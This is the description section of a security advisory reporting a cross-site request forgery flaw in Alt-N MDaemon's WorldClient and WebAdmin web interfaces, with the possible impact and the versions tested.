VULNERABILITY DESCRIPTION:
==========================
Alt-N WorldClient and WebAdmin applications are prone to a cross-site
request-forgery vulnerability. It should be noted that partial
protection is provided by the Session parameter, but this alone cannot
be considered as an adequate protection mechanism.

An attacker can exploit this issue to perform different actions on the
affected application without the user's consent. For example, the
attacker can change the user's password, forward a copy of the user's
emails to a different email account, retrieve his/her address book,
send email messages to other users/email addresses and/or perform
other similar tasks.

Alt-N MDaemon v13.0.3 & v12.5.6 were tested and found vulnerable;
other versions may also be affected.
